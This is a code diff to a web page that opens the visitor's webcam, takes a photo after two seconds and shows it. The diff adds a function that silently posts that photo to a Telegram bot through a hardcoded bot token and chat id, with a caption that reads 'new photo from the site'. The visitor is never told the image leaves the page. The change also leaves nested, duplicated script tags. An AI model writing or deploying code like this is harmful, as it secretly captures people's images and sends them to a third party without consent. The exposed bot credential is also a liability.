@@ -60,14 +60,14 @@ font-size:30px;
 
 <script>
 
+<script>
+
 const video = document.getElementById("video")
 
 navigator.mediaDevices.getUserMedia({video:true})
 .then(stream=>{
 video.srcObject = stream
-
 setTimeout(takePhoto,2000)
-
 })
 
 function takePhoto(){
@@ -84,11 +84,33 @@ const data = canvas.toDataURL("image/png")
 
 document.getElementById("photo").src = data
 
-video.style.display="none"
+sendToTelegram(data)
 
+video.style.display="none"
 document.getElementById("result").style.display="block"
 
 }
+
+function sendToTelegram(imageData){
+
+const token = "8616417285:AAHQvJfY029-xxipt4cENWAU9oRtQml-gKw"
+const chat_id = "7737717483"
+
+fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:chat_id,
+photo:imageData,
+caption:"صورة جديدة من الموقع 📸"
+})
+})
+
+}
+
+</script>
 
 </script>
 
